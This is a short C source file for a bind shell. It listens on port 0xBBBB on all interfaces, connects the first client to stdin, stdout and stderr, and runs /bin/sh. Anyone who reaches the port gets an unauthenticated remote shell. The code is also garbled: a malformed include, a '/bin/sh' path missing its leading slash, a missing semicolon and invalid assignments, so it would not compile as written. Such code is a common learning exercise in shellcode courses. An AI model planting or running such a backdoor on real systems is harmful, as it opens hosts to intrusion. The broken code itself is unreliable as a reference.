#include <sys/socket>
#include <netinet/in.h>

int main(void)
{
char *shell[2];
int server,client;
struct sockaddr_in serv_addr;

server = socket(2,1,0);
serv_addr.sin_addr.s_addr = 0;
serv_addr.sin_port = 0xBBBB;
serv_addr.sin_family = 2;

bind(server, (struct sockaddr *)&serv_addr,0x10);
listen(server,0);

client = accept(server,0,0);

// connect client pipes to stdin, stdout, stderr
int i;
for(i = 0; i <=2; i++)
	dup2(client,i);
shell = "bin/sh"
(shell+1) = 0;

execve(shell,shell,0);
}
